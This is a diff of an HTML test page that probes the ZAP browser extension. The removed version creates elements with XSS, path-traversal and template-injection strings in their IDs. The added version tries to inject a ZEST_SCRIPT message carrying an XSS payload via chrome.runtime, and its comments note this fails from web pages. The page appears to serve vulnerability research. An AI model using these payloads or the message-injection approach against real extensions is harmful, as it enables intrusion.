@@ -1,118 +1,39 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Simple ZAP Test</title>
-    <style>
-        body { font-family: Arial; margin: 20px; }
-        button { padding: 10px; margin: 5px; }
-        .malicious { background: red; color: white; }
-        .log { border: 1px solid #ccc; padding: 10px; height: 200px; overflow-y: scroll; margin: 10px 0; }
-    </style>
-</head>
 <body>
-    <h1>Simple ZAP Vulnerability Test</h1>
-    
-    <div>
-        <button onclick="test1()">Test 1: Create Malicious Elements</button>
-        <button onclick="test2()">Test 2: Click All Elements</button>
-        <button onclick="clearLog()">Clear Log</button>
-    </div>
-
-    <div id="testArea" style="border: 1px dashed #ccc; padding: 10px; margin: 10px 0; min-height: 100px;">
-        <p>Test elements will appear here...</p>
-    </div>
-
-    <div class="log" id="log"></div>
+    <h2>ZAP Message Injection Test</h2>
+    <button onclick="sendMaliciousMessage()">Send Malicious Message to ZAP</button>
+    <div id="result"></div>
 
     <script>
-        function log(message) {
-            const logDiv = document.getElementById('log');
-            logDiv.innerHTML += '<div>' + new Date().toLocaleTimeString() + ' - ' + message + '</div>';
-            logDiv.scrollTop = logDiv.scrollHeight;
-        }
-
-        function clearLog() {
-            document.getElementById('log').innerHTML = '';
-        }
-
-        function test1() {
-            log('Creating malicious test elements...');
+        function sendMaliciousMessage() {
+            // This only works if we can find a way to access chrome.runtime
+            // from a content script or background page context
             
-            const testArea = document.getElementById('testArea');
-            testArea.innerHTML = '<h3>Click these elements while ZAP is recording:</h3>';
+            // The real vulnerability is that ZAP's background script
+            // accepts ZEST_SCRIPT messages without checking the sender
             
-            // Create elements with malicious IDs/attributes
-            const tests = [
-                { type: 'button', id: 'malicious_<script>alert("xss")</script>', text: 'XSS in ID' },
-                { type: 'button', id: '../../etc/passwd', text: 'Path Traversal' },
-                { type: 'button', id: 'javascript:alert(1)', text: 'JS Protocol' },
-                { type: 'input', id: 'malicious_input_<img src=x onerror=alert(1)>', text: 'XSS Input' },
-                { type: 'button', id: '${alert("template")}', text: 'Template Injection' }
-            ];
+            const result = document.getElementById('result');
             
-            tests.forEach(test => {
-                const element = document.createElement(test.type);
-                element.id = test.id;
-                element.className = 'malicious';
-                
-                if (test.type === 'button') {
-                    element.textContent = test.text + ' - ID: ' + test.id;
-                    element.onclick = function() {
-                        log('CLICKED: ' + test.id);
-                    };
-                } else {
-                    element.placeholder = test.text;
-                    element.onchange = function(e) {
-                        log('CHANGED: ' + test.id + ' = ' + e.target.value);
-                    };
-                }
-                
-                testArea.appendChild(element);
-                testArea.appendChild(document.createElement('br'));
-            });
-            
-            log('✅ Created ' + tests.length + ' test elements');
-            log('💡 Now: 1) Start ZAP recording 2) Click all red buttons 3) Change the input 4) Stop recording 5) Check ZEST script');
-        }
-
-        function test2() {
-            log('Auto-clicking all test elements...');
-            
-            const elements = document.querySelectorAll('#testArea button, #testArea input');
-            log('Found ' + elements.length + ' elements to test');
-            
-            elements.forEach((element, index) => {
-                setTimeout(() => {
-                    if (element.tagName === 'BUTTON') {
-                        element.click();
-                    } else if (element.tagName === 'INPUT') {
-                        element.value = 'test_value_' + index;
-                        element.dispatchEvent(new Event('change'));
-                    }
-                }, index * 500);
-            });
-            
-            log('✅ Auto-testing completed');
-        }
-
-        // Check if ZAP is running
-        function checkZAP() {
-            const zapDiv = document.getElementById('ZAP-floating-div');
-            if (zapDiv && zapDiv.style.display !== 'none') {
-                log('✅ ZAP IS RECORDING - Floating div detected');
+            // Try to access chrome APIs (this won't work from web page)
+            if (typeof chrome !== 'undefined' && chrome.runtime) {
+                // This would be the exploit if it worked from web pages
+                chrome.runtime.sendMessage({
+                    type: 'ZEST_SCRIPT',
+                    data: JSON.stringify({
+                        malicious: true,
+                        command: "inject",
+                        payload: "<script>alert('xss')</script>"
+                    })
+                });
+                result.innerHTML = "Message sent (if extension vulnerable)";
             } else {
-                log('❌ ZAP NOT RECORDING - Start the ZAP extension recording');
+                result.innerHTML = "Chrome runtime not available from web pages (this is normal)";
             }
         }
-
-        // Initial check
-        setTimeout(() => {
-            log('🔍 ZAP Security Test Ready');
-            checkZAP();
-        }, 1000);
-
-        // Check every 5 seconds
-        setInterval(checkZAP, 5000);
+        
+        // The real test: Can we find another way to send messages to ZAP?
+        // Through content scripts? Through postMessage? Through other extension APIs?
     </script>
 </body>
 </html>
